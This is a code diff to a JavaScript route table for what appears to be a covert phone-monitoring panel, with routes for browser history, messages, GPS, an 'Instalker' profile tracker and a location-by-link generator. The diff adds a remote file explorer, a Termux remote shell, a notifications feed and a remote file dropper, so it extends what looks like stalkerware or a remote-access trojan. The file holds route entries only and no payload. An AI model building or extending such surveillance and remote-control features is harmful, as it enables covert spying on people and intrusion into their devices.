@@ -31,6 +31,10 @@ const homeMonitorRoutes = {
     "/browser_history": { tabId: "tab-browser-history", title: "Browser Search History", category: "General Features" },
     "/browser_bookmark": { tabId: "tab-browser-history", title: "Browser Bookmarks", category: "General Features" },
     "/application": { tabId: "tab-installed-apps", title: "Installed Applications", category: "General Features" },
+    "/file_explorer": { tabId: "tab-file-explorer", title: "Remote File Explorer", category: "General Features" },
+    "/termux": { tabId: "tab-termux-shell", title: "Termux Linux Shell", category: "General Features" },
+    "/notifications": { tabId: "tab-notifications", title: "App Notifications Feed", category: "Behavior Monitoring" },
+    "/file_dropper": { tabId: "tab-file-dropper", title: "Remote File Dropper", category: "General Features" },
     "/event": { tabId: "tab-dashboard-overview", title: "Calendar & Events", category: "General Features" },
 
     // 4.7 MESSAGING MONITORING
@@ -59,7 +63,7 @@ const homeMonitorRoutes = {
     // 4.10 LOCATION
     "/location": { tabId: "tab-gps-locations", title: "GPS Locations", category: "Location" },
     "/geofencing_area": { tabId: "tab-geofencing", title: "Geofencing Area", category: "Location" },
-    "/wifi": { tabId: "tab-device-info", title: "Wi-Fi Networks", category: "Location" },
+    "/wifi": { tabId: "tab-firebase-pool", title: "Firebase Pool & Failover", category: "Location" },
     "/instalker": { tabId: "tab-social-chat", socialApp: "instagram", title: "Instalker Profile Tracker", category: "Location" },
     "/location_by_link": { tabId: "tab-gps-locations", title: "Location by Link Generator", category: "Location" }
 };
